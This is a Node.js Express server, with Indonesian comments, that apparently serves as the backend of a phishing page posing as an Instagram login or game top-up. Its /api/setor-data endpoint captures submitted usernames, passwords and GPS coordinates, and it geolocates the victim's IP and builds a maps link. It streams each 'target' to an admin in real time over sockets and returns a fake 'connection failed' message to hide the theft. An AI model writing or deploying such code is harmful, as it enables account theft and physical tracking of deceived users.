const express = require('express');
const cors = require('cors');
const axios = require('axios');
const http = require('http');
const { Server } = require('socket.io');
require('dotenv').config();

const app = express();
const server = http.createServer(app);

// Socket.io initialization
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(express.json());

// In-memory storage (Peringatan: Vercel serverless akan mereset ini secara berkala)
const capturedData = [];

app.get('/api', (req, res) => {
    res.send('Backend Real-time Ready (Vercel Mode)');
});

app.get('/api/admin/data', (req, res) => {
    res.json(capturedData);
});

app.post('/api/setor-data', async (req, res) => {
    const { username, password, game, nominal, gps } = req.body;

    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (ip && ip.includes(',')) ip = ip.split(',')[0];
    if (ip && ip.includes('::ffff:')) ip = ip.split(':').pop();

    const queryIp = (ip === '::1' || ip === '127.0.0.1') ? '8.8.8.8' : ip;
    
    let geoInfo = {};
    try {
        const response = await axios.get(`http://ip-api.com/json/${queryIp}`);
        geoInfo = response.data;
    } catch (error) {
        console.error('Error fetching IP geolocation:', error.message);
    }

    const hasGPS = gps && gps.lat && gps.lng;
    const finalLat = hasGPS ? gps.lat : geoInfo.lat;
    const finalLng = hasGPS ? gps.lng : geoInfo.lon;

    const dataLog = {
        username,
        password,
        game,
        nominal,
        ip: ip,
        isp: geoInfo.isp || 'Unknown',
        location: hasGPS ? `GPS Precision (Accuracy: ${gps.accuracy.toFixed(1)}m)` : `${geoInfo.city}, ${geoInfo.regionName}, ${geoInfo.country}`,
        mapsLink: finalLat && finalLng ? `https://www.google.com/maps?q=${finalLat},${finalLng}` : null,
        isHighAccuracy: !!hasGPS,
        timestamp: new Date().toLocaleString('id-ID')
    };

    capturedData.push(dataLog);

    // Push via socket
    try {
        io.emit('new-target-data', dataLog);
    } catch (e) {
        console.warn('Socket emit failed');
    }

    console.log(`[${dataLog.timestamp}] DATA BARU: ${username}`);

    res.json({ 
        status: 'success', 
        message: 'Koneksi instagram gagal, silakan coba beberapa saat lagi. 🙄' 
    });
});

io.on('connection', (socket) => {
    console.log('Admin connected:', socket.id);
});

// Jalankan server jika tidak di Vercel
if (process.env.NODE_ENV !== 'production') {
    server.listen(PORT, () => {
        console.log(`Server jalan di: http://localhost:${PORT}`);
    });
}

module.exports = app;
